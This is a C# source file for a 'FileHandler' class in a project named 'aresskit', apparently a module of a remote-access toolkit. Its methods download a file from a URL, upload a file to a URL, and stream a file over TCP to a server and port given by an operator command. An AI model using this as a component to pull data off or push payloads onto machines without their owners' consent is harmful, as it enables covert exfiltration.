using System;
using System.Net;
using System.Net.Sockets;


namespace aresskit
{
    class FileHandler
    {
        public static bool downloadFile(string filename, string url)
        {
            using (WebClient client = new WebClient())
            {
                try
                {
                    client.DownloadFile(url, filename);
                }
                catch (WebException)
                {
                    return false;
                }
                // File downloaded
                return true;
            }
        }

        public static string uploadFile(string filename, string url)
        {
            using (WebClient client = new WebClient())
            {
                try
                {
                    byte[] responseArray = client.UploadFile(url, filename);
                    return System.Text.Encoding.ASCII.GetString(responseArray);
                }
                catch (WebException)
                {
                    return "Upload failed";
                }
                // File uploaded
            }
        }

        public string uploadFileNew(string cmdstr)
        {
            TcpClient client;
            string output = "Please type command as: 'FileHandler::uploadFileNew filename server port'";
            try
            {
                if (cmdstr == null)
                {
                    return output;
                }
                else
                {
                    client = new TcpClient();
                    string[] paramData = cmdstr.Split(new char[] { ' ' });
                    string filename = paramData[0];
                    string server = paramData[1];
                    int port = Int32.Parse(paramData[2]);
                    client.Connect(server, port);

                    client.Client.SendFile(filename);
                    client.Client.Shutdown(SocketShutdown.Both);
                    client.Client.Close();
                }
            }
            catch (WebException)
            {
                return output;
            }
            // File uploaded
            return "File uploaded with success!";
        }
    }
}
